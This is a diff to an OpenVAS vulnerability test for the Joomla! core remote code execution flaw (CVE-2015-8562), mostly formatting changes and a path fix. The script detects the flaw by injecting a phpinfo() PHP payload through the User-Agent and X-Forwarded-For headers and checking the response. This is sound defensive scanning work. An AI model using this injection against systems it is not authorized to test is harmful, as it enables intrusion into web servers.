@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_79195.nasl 11218 2018-09-04 11:43:35Z mmartin $
+# $Id: gb_joomla_79195.nasl 11323 2018-09-11 10:20:18Z ckuersteiner $
 #
 # Joomla! Core Remote Code Execution Vulnerability
 #
@@ -34,25 +34,33 @@ if (description)
   script_cve_id("CVE-2015-8562", "CVE-2015-8563", "CVE-2015-8564", "CVE-2015-8565");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11218 $");
+  script_version("$Revision: 11323 $");
 
   script_name("Joomla! Core Remote Code Execution Vulnerability");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/79195");
   script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html");
 
-  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute arbitrary code in the context of the affected application.");
-  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response for the output of the phpinfo() command.");
-  script_tag(name:"insight", value:"Browser information is not filtered properly while saving the session values into the database which leads to a Remote Code Execution vulnerability.");
+  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute arbitrary code
+in the context of the affected application.");
+
+  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response for the
+output of the phpinfo() command.");
+
+  script_tag(name:"insight", value:"Browser information is not filtered properly while saving the session values
+into the database which leads to a Remote Code Execution vulnerability.");
+
   script_tag(name:"solution", value:"Update to 3.4.6 or higher");
+
   script_tag(name:"summary", value:"Joomla! is prone to remote code-execution vulnerability.");
-  script_tag(name:"affected", value:"Joomla 1.5.0 through 3.4.5,
- Joomla 3.2.0 through 3.4.5 and Joomla 3.4.0 through 3.4.5");
+
+  script_tag(name:"affected", value:"Joomla 1.5.0 through 3.4.5, Joomla 3.2.0 through 3.4.5 and Joomla 3.4.0
+through 3.4.5");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-04 13:43:35 +0200 (Tue, 04 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:20:18 +0200 (Tue, 11 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-12-16 15:35:12 +0100 (Wed, 16 Dec 2015)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -61,7 +69,7 @@ if (description)
   script_require_ports("Services/www", 80);
   script_mandatory_keys("joomla/installed");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
@@ -70,6 +78,9 @@ include("host_details.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+
+if (dir == "/")
+  dir = "";
 
 ex = 'phpinfo();JFactory::getConfig();exit';
 ex_len = strlen( ex );
@@ -87,10 +98,8 @@ injection = make_list( "User-Agent:","X-Forwarded-For:" );
 host = http_host_name( port:port );
 cookie = NULL;
 
-foreach inj ( injection )
-{
-  for( i = 0; i < 4; i++ )
-  {
+foreach inj ( injection ) {
+  for( i = 0; i < 4; i++ ) {
     req = 'GET ' + dir + '/ HTTP/1.1\r\n' +
           'Host: ' + host + '\r\n' +
           'Connection: close\r\n';
@@ -103,14 +112,12 @@ foreach inj ( injection )
 
     buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-    if( ! cookie )
-    {
+    if( ! cookie ) {
       co = eregmatch( pattern:'Set-Cookie: ([^\r\n]+)', string:buf );
       cookie = co[1];
     }
 
-    if( "<title>phpinfo()</title>" >< buf )
-    {
+    if( "<title>phpinfo()</title>" >< buf ) {
       security_message( port:port );
       exit( 0 );
     }
